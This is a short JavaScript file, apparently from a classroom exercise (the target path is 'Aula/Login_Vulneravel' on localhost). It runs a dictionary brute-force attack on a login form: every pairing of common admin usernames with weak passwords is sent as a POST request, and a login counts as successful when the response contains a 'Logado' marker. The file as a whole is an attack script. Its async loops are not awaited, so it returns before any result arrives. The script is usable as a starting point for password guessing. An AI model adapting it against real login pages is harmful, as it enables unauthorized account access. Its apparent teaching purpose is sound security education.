startFB().then((res)=>{
   console.log(res);
});


function getDic() {
   return {
      logins: ['administrador', 'admin', 'adm'],
      senhas: ['123', '1234', '12345', 'administrador', 'admin', 'adm']
   }
}

async function startFB(){
   dicionario = getDic(); 

   let user = {
      login: null,
      senha: null
   }

   dicionario.logins.map(async(login)=>{
      dicionario.senhas.map(async(senha)=>{
         let data = { login: login, senha: senha };
         let response = await sendPost(data);
         if(verificaLogin(response.res)){
            user.login = login;
            user.senha = senha;
         }
      });
   });

   return user;
}

function verificaLogin(txt) {
   return (txt.includes('<h3>Logado</h3>'));
}

async function sendPost(data) {

   const url = "http://localhost/Aula/Login_Vulneravel/";

   let response = {
      success: false,
      res: null
   }

   await $.ajax({
      url: url,
      type: 'POST',
      data: data,
      success: function (res) {
         response.success = true;
         response.res = res;
      },
      error: function (err) {
         response.success = false;
         response.res = err;
      }
   });

   return response;

}